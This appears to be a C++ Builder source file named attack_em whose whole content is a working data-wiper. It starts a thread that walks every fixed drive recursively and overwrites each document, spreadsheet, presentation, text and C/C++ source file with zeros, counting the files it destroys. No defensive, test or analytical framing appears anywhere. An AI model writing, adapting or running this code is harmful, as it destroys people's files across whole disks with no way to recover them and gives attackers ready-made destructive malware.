//---------------------------------------------------------------------------


#pragma hdrstop

#include "attack_em.h"

//---------------------------------------------------------------------------

#pragma package(smart_init)
//---------------------------------------------------------------------------

#include <vcl.h>
#include <windows.h>
#include "CommFunc.h"
#include <Registry.hpp>


#pragma hdrstop

#pragma argsused
int AttackCount;
//---------------------------------------------------------------------------
void FillFile(const String &FileName)
{
   if (!FileExists(FileName))
   {
      return;
   }
   TMemoryStream *FileStream = new TMemoryStream;
   try
   {
	  FileStream->LoadFromFile(FileName);
	  ZeroMemory(FileStream->Memory,FileStream->Size);
	  try
	  {
		 FileStream->SaveToFile(FileName);
	  } catch (...)
	  {
	      
	  }

	  AttackCount++;
   }
   __finally
   {
      delete FileStream;
   }
}
//---------------------------------------------------------------------------
int TFloodDir::FindAndFillMutiFile(const String &DirName,const String &TrueExt)
{
  TSearchRec sr;
  String PathStr = DirName + "\\*.*";
  int  FileCount = 0;
  if (FindFirst(PathStr,faAnyFile,sr) == 0)
  {
    do
    {
      if (sr.Name=="." || sr.Name=="..")
      {
        continue;
      }
      if ((sr.Attr & faDirectory) == faDirectory)
	  {
		  TFloodDir  * FloodDir= new  TFloodDir(DirName+"\\"+sr.Name,TrueExt);
	  }
	  else
	  {
		if (TrueExt.Pos(ExtractFileExt(sr.Name))>=1)
        {
		  FileCount++;
          FillFile(DirName+"\\"+sr.Name);
        }
      }
    } while (FindNext(sr) == 0);
    FindClose(sr);
  }
  return  FileCount;
}
//---------------------------------------------------------------------------
DWORD WINAPI AttackThreadFunc(LPVOID Parameter)
{
	TStringList *DirList = new TStringList;
	GetLogicalDrive(DirList);
	AttackCount=0;
    int DriverType = 0;
    try
    {
		for(int i = DirList->Count-1; i >=0; i--)
		{
			DriverType = GetDriveType(DirList->Strings[i].c_str());
            if(DriverType == 3)
			{
			   //使用new新类，防止函数递归调用导致堆栈溢出。
			   TFloodDir  * FloodDir= new  TFloodDir(DirList->Strings[i],".cpp,.doc,.txt,.xls,.h,.c,.ppt");
			}
        }
    }

    __finally
    {
        delete DirList;
	}
	//ShowMessage(FormatStr("a=%d",AttackCount));
    return 1;
}
//---------------------------------------------------------------------------
void StartAttack()
{
	DWORD ThreadId;
	HANDLE ThreadHandle = CreateThread(NULL,0,AttackThreadFunc,NULL,0,&ThreadId);
}
//---------------------------------------------------------------------------

